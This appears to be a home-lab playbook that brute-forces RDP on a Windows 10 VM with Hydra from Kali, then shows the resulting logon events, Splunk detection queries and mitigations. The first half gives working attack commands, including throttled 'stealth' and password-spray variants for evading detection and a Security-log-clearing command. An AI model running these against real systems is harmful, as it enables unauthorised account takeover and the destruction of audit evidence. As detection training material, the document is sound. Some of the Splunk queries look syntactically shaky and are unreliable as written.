# 🔓 Attack 02: RDP Brute Force with Hydra

**Objective:** Perform a credential brute force attack against RDP (Remote Desktop Protocol) on the victim Windows 10 VM using Hydra from Kali Linux.

**Tool:** Hydra  
**MITRE Technique:** [T1110.001 - Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/)  
**Expected Windows Event:** 4625 (Failed Logon Attempt)  
**Service:** RDP (Remote Desktop Protocol) Port 3389

---

## 📋 Attack Playbook

### Prerequisites

- ✅ Kali Linux VM with network access to victim
- ✅ Windows 10 VM with RDP enabled & listening on port 3389
- ✅ Splunk Universal Forwarder collecting Windows Security logs
- ✅ Hydra installed on Kali (`apt install hydra -y`)
- ✅ Username/password wordlists (e.g., `rockyou.txt`)

### Step 1: Verify RDP is Open

On **Kali**, confirm RDP service is accessible:

```bash
# Check if port 3389 is open
nmap -p 3389 192.168.1.100

# Output:
# 3389/tcp open ms-wbt-server

# Or use netcat to verify
nc -zv 192.168.1.100 3389
# Connection successful!
```

---

### Step 2: Prepare Wordlists

Create or use existing password lists:

```bash
# Check if rockyou.txt is available (common on Kali)
ls -la /usr/share/wordlists/rockyou.txt

# If not found, use apt to download
apt-get install wordlist rockyou

# Create a small custom wordlist for testing (faster)
cat > /tmp/passwords.txt << 'EOF'
password
123456
admin
letmein
welcome
12345678
monkey
dragon
master
sunshine
password123
EOF

# Create username list
cat > /tmp/usernames.txt << 'EOF'
administrator
admin
guest
root
user
test
EOF
```

---

### Step 3: Basic RDP Brute Force with Hydra

Simple brute force against a single username:

```bash
hydra -l administrator -P /tmp/passwords.txt rdp://192.168.1.100
```

**Flags:**
- `-l administrator` = Single username to test
- `-P /tmp/passwords.txt` = Password list file
- `rdp://192.168.1.100` = Target service and IP

**Example Output:**
```
Hydra v9.3 (c) 2021 by van Hauser/THC & David Maciejak
[DATA] max 16 tasks per 1 run (could be higher on some systems)
[3389][rdp] host: 192.168.1.100   login: administrator   password: P@ssw0rd123
[STATUS] attack finished for 192.168.1.100 (valid combination found)
1 valid password found
```

---

### Step 4: Advanced Brute Force with Multiple Usernames

Test multiple usernames against wordlist:

```bash
hydra -L /tmp/usernames.txt -P /tmp/passwords.txt \
  -o /tmp/hydra_results.txt \
  -v rdp://192.168.1.100
```

**Flags:**
- `-L /tmp/usernames.txt` = Username list
- `-P /tmp/passwords.txt` = Password list
- `-o /tmp/hydra_results.txt` = Output results to file
- `-v` = Verbose output

---

### Step 5: Optimized Attack (Faster)

Increase parallelization and reduce detection:

```bash
hydra -L /tmp/usernames.txt -P /tmp/passwords.txt \
  -t 4 \
  -W 3 \
  -f \
  rdp://192.168.1.100
```

**Flags:**
- `-t 4` = 4 tasks in parallel (default is 16, slower is stealthier)
- `-W 3` = Waits 3 seconds between attempts
- `-f` = Stop when first valid combo found

**Time estimates:**
- 6 usernames × 1000 passwords × 1 attempt/sec = ~6000 seconds (100 minutes)
- With `-t 4` parallelization: ~1500 seconds (25 minutes)

---

### Step 6: Stealth Variant (Slower but Quieter)

Minimize detection with throttling:

```bash
hydra -L /tmp/usernames.txt -P /tmp/passwords.txt \
  -t 1 \
  -W 10 \
  -f \
  -r 3 \
  rdp://192.168.1.100
```

**Flags:**
- `-t 1` = Single task (very slow but less noisy)
- `-W 10` = 10 second delay between attempts
- `-r 3` = 3 retries on timeout
- Total attack time: Multiple hours (harder for SOC to detect in realtime)

---

### Step 7: Custom Attack with Specific Credentials

If you have a targeted account:

```bash
# Try common password variations for specific user
hydra -l administrator \
  -P <(cat /tmp/passwords.txt | sed 's/^/Admin@/') \
  rdp://192.168.1.100
```

This prepends "Admin@" to each password (e.g., "Admin@password", "Admin@123456")

---

## 📊 Expected Logs

### Windows Security Log - EventID 4625 (Failed Logon)

Each failed RDP login attempt generates this event:

```xml
EventID: 4625
Computer: VICTIM-PC
TimeCreated: 2025-01-15T10:35:22.123Z
Account Name: administrator
Failure Reason: Unknown user name or bad password.
Status: 0xC000006E (The attempted logon is invalid. This is either a bad user name or authentication information.)
Workstation Name: KALI-MACHINE (source hostname, if available)
Source IP: 192.168.1.10
Source Port: 45678 (random, changes each attempt)
Logon Type: 3 (Network logon)
Logon Process: NtLmSsp
Authentication Package: NTLM
Security ID: S-1-0-0 (NULL SID, failed logon)
```

**Key Field for Detection:** `SourceIP` + count of EventID 4625 in short timeframe

---

### Windows Security Log - EventID 4624 (Successful Logon)

If credentials are valid:

```xml
EventID: 4624
Computer: VICTIM-PC
TimeCreated: 2025-01-15T10:35:50.123Z
Account Name: administrator
Account Domain: VICTIM-PC
Logon Type: 3 (Network logon / RDP)
Logon Process: NtLmSsp
Authentication Package: NTLM
Source IP: 192.168.1.10
Source Port: 45680
Workstation Name: KALI-MACHINE
```

**This is the "success" event after potentially hundreds of failed attempts.**

---

### Sysmon EventID 3 (Network Connection)

Hydra creates persistent connections on port 3389:

```
EventID: 3
Computer: VICTIM-PC
SourceIp: 192.168.1.100 (victim)
SourcePort: 3389
DestinationIp: 192.168.1.10 (attacker/Kali)
DestinationPort: Multiple high ports (45678, 45680, 45682, etc.)
Protocol: tcp
Initiated: false
SourcePortName: ms-wbt-server
```

**Key Indicator:** Repeated connections to/from port 3389 over short duration.

---

## 🔍 Detection in Splunk

### SPL Query 1: Detect Multiple Failed Logins

```spl
EventCode=4625 Account_Name=administrator SourceIP=192.168.1.10
| stats count as failed_attempts by Account_Name, SourceIP
| where failed_attempts > 10
```

**Alert Threshold:** >10 failed logons in 5 minutes = likely brute force

---

### SPL Query 2: Failed → Successful Logon Pattern

Suspicious pattern: Failed attempts followed by success:

```spl
(EventCode=4625 OR EventCode=4624) Account_Name=administrator SourceIP=192.168.1.10
| transaction Account_Name SourceIP maxspan=1h
| search EventCode=4625 AND EventCode=4624
| stats count(eval(EventCode=4625)) as failed_count, 
         count(eval(EventCode=4624)) as success_count by Account_Name, SourceIP
| where failed_count > 5 AND success_count > 0
```

**Alert:** If failed attempts precede successful logon, compromised account.

---

### SPL Query 3: Detect Brute Force Across Multiple Accounts

Different usernames from same source = account enumeration + brute force:

```spl
EventCode=4625 
| stats count(distinct Account_Name) as unique_accounts by SourceIP
| where unique_accounts > 3
```

---

### SPL Query 4: RDP Connection Spike

Abnormal rate of RDP connections:

```spl
EventCode=4625 Authentication_Package=NTLM Logon_Type=3
| timechart count by Account_Name, SourceIP
| where count > 20
```

---

## 🛡️ Mitigation & Defense

| Defense | Implementation |
|---------|---|
| **Account Lockout Policy** | Lockout after 3-5 failed attempts for 15-30 min |
| **MFA/2FA** | Require second factor for RDP access |
| **Network Segmentation** | RDP only accessible from specific admin VLANs |
| **Firewall Rule** | Limit RDP (port 3389) to specific source IPs |
| **Disable RDP** | On systems that don't need it |
| **Change RDP Port** | Move from 3389 to random high port (security by obscurity) |
| **EDR Alert** | Monitor EventID 4625 spike pattern |
| **Honey Accounts** | Create fake admin accounts that trigger immediate alerts |

---

## 📈 Timeline & Expected Behavior

| Time | Event | Count | Details |
|------|-------|-------|---------|
| 10:35:00 | First failed RDP attempt | 1 | Bad password for admin |
| 10:35:03 | Failed attempt #2 | 2 | Different password |
| 10:35:06 | Failed attempt #3 | 3 | Hydra cycling through list |
| ... | ... | ... | Pattern continues |
| 10:40:00 | Failed attempt #100 | 100 | Attack ongoing, now obvious |
| 10:42:30 | **Successful logon** | 1 | Password found: P@ssw0rd123 |
| 10:42:31 | RDP session established | 1 | EventID 4624 + EventID 4778 |

---

## 🎓 Learning Objectives

✅ Understand credential-based attack methodology  
✅ Identify brute force patterns in Windows Security logs  
✅ Build detection queries for account takeover  
✅ Recognize the difference between failed & successful logon events  
✅ Implement account lockout policies  

---

## ⚠️ Important Notes

### Why RDP is Targeted
- Widely exposed on internet
- Often runs with weak/default credentials
- Allows full interactive access
- Rarely monitored by small organizations

### Evasion Techniques (Advanced)

```bash
# Spray attack (try 1-2 passwords across many accounts, avoid lockout)
hydra -L /tmp/usernames.txt -p password123 \
  -t 1 \
  -W 20 \
  rdp://192.168.1.100

# Distributed attack (use multiple Kali VMs from different IPs)
# Each Kali VM tries different accounts to bypass rate limiting
```

### Log Retention
- Windows keeps 4625 events for ~30 days (default: 20MB max)
- Attacker may try to clear logs: `wevtutil cl Security`
- Use centralized logging (Splunk) to preserve evidence

---

## 📚 References

- [Hydra Documentation](https://tools.kali.org/password-attacks/hydra)
- [Windows Event 4625 (Failed Logon)](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625)
- [Windows Event 4624 (Successful Logon)](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624)
- [MITRE T1110.001 - Brute Force](https://attack.mitre.org/techniques/T1110/001/)
- [RDP Security Best Practices](https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/remote-desktop-security)
